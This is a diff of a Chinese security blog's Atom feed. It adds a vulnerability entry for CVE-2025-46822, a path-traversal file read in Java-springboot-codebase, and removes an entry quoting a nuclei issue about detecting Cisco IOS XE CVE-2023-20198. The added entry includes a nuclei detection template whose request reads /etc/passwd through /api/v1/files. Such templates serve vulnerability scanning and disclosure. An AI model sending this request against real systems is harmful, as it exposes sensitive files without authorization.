@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-13T07:45:19.904Z</updated>
+  <updated>2025-06-13T08:30:22.376Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Java-springboot-codebase 任意文件读取漏洞</title>
+    <link href="http://example.com/2025/06/13/github_1778685053/"/>
+    <id>http://example.com/2025/06/13/github_1778685053/</id>
+    <published>2025-06-13T08:30:22.376Z</published>
+    <updated>2025-06-13T08:30:22.376Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Java-springboot-codebase 任意文件读取漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-46822</li></ul><p><strong>漏洞类型：</strong> 文件读取</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> OsamaTaher&#x2F;Java-springboot-codebase是一个Java和Spring Boot代码片段、应用程序和项目的集合。在提交c835c6f7799eacada4c0fc77e0816f250af01ad2之前，不足的路径遍历机制使得绝对路径遍历成为可能。此漏洞允许未经授权访问敏感的内部文件。提交c835c6f7799eacada4c0fc77e0816f250af01ad2包含了对该问题的补丁。</p><p><strong>产品厂商：</strong> OsamaTaher</p><p><strong>产品名称：</strong> Java-springboot-codebase</p><p><strong>影响版本：</strong> 1.1</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/5f0682f7aebd8bcebcdfece881cdbf8f03d3932f/http%2Fcves%2F2025%2FCVE-2025-46822.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/5f0682f7aebd8bcebcdfece881cdbf8f03d3932f/http%2Fcves%2F2025%2FCVE-2025-46822.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2025-46822</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Java-springboot-codebase 1.1 - Arbitrary File Read</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">haliteroglu25</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">high</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">OsamaTaher/Java-springboot-codebase is a collection of Java and Spring Boot code snippets, applications, and projects. Prior to commit c835c6f7799eacada4c0fc77e0816f250af01ad2, insufficient path traversal mechanisms make absolute path traversal possible. This vulnerability allows unauthorized access to sensitive internal files. Commit c835c6f7799eacada4c0fc77e0816f250af01ad2 contains a patch for the issue.</span><br><span class="hljs-attribute">  reference</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/OsamaTaher/Java-springboot-codebase</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://nvd.nist.gov/vuln/detail/CVE-2025-46822</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/OsamaTaher/Java-springboot-codebase/security/advisories/GHSA-q6mm-cm37-w637</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/OsamaTaher/Java-springboot-codebase/commit/c835c6f7799eacada4c0fc77e0816f250af01ad2</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/PuddinCat/GithubRepoSpider</span><br>  <span class="hljs-attribute">classification</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">epss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.0214</span><br>    <span class="hljs-attribute">epss-percentile</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.83386</span><br>  <span class="hljs-attribute">metadata</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">verified</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br>    <span class="hljs-attribute">max-request</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cve,cve2025,java,springboot,codebase,lfi</span><br><br><span class="hljs-attribute">flow</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http(1) &amp;&amp; http(2)</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br>        <span class="hljs-attribute">GET / HTTP/1.1</span><br><span class="hljs-attribute">        Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;Hostname&#125;&#125;</span><br>        <span class="hljs-attribute">Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: dsl</span><br>        <span class="hljs-attribute">dsl</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;contains_any(body, &quot;Whitelabel Error Page&quot;,&quot;explicit mapping&quot;)&#x27;</span><br>        <span class="hljs-attribute">internal</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br>        <span class="hljs-attribute">GET /api/v1/files/etc/passwd HTTP/1.1</span><br><span class="hljs-attribute">        Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;Hostname&#125;&#125;</span><br><br>    <span class="hljs-attribute">matchers-condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: regex</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">body</span><br>        <span class="hljs-attribute">regex</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;root:.*:0:0:&quot;</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: status</span><br>        <span class="hljs-attribute">status</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">200</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Java-springboot-codebase 任意文件读取漏洞&lt;/p&gt;
+&lt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="文件读取" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
+    
+  </entry>
   
   <entry>
     <title>WordPress Traffic Monitor Plugin 未授权漏洞</title>
@@ -517,33 +544,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Cisco IOS XE 远程代码执行漏洞</title>
-    <link href="http://example.com/2025/06/12/github_2810106518/"/>
-    <id>http://example.com/2025/06/12/github_2810106518/</id>
-    <published>2025-06-12T23:00:17.164Z</published>
-    <updated>2025-06-12T23:00:17.160Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Cisco IOS XE 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-20198</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Cisco IOS XE存在一个远程代码执行漏洞，攻击者可以通过构造特定的HTTP或HTTPS请求来利用此漏洞。该漏洞的利用可能因访问协议（HTTP或HTTPS）的不同而有所差异，修改目标端点可能有助于检测或利用此漏洞。</p><p><strong>产品厂商：</strong> Cisco</p><p><strong>产品名称：</strong> Cisco IOS XE</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12324">https://github.com/projectdiscovery/nuclei-templates/issues/12324</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Template-IDs-or-paths"><a href="#Template-IDs-or-paths" class="headerlink" title="Template IDs or paths"></a>Template IDs or paths</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">http/cves/2023/CVE-2023-20198.yaml<br></code></pre></td></tr></table></figure><h4 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">-</span> OS: Ubuntu 22.04<br><span class="hljs-bullet">-</span> Nuclei: v3.4.4<br><span class="hljs-bullet">-</span> Go: 1.23.0<br></code></pre></td></tr></table></figure><h4 id="Steps-To-Reproduce"><a href="#Steps-To-Reproduce" class="headerlink" title="Steps To Reproduce"></a>Steps To Reproduce</h4><ol><li>Run template against CVE-2023-20198 vulnerable target on https</li><li>False negative</li></ol><p>The issue is most likely caused by the target endpoint on Cisco differing depending whether access is via http or https. I could achieve detection by modifying the target endpoint on the template to &#x2F;%2577ebui_wsma_https</p><h4 id="Relevant-dumped-responses"><a href="#Relevant-dumped-responses" class="headerlink" title="Relevant dumped responses"></a>Relevant dumped responses</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">no detection (details below)<br></code></pre></td></tr></table></figure><h4 id="Anything-else"><a href="#Anything-else" class="headerlink" title="Anything else?"></a>Anything else?</h4><p><img src="https://github.com/user-attachments/assets/50ec96da-af54-4583-95f1-17abb0d7c031" alt="Image"></p><p>post endpoint modification:</p><p><img src="https://github.com/user-attachments/assets/76f2be0d-f7ae-4952-9925-da07051d6be4" alt="Image"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Cisco IOS XE 远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
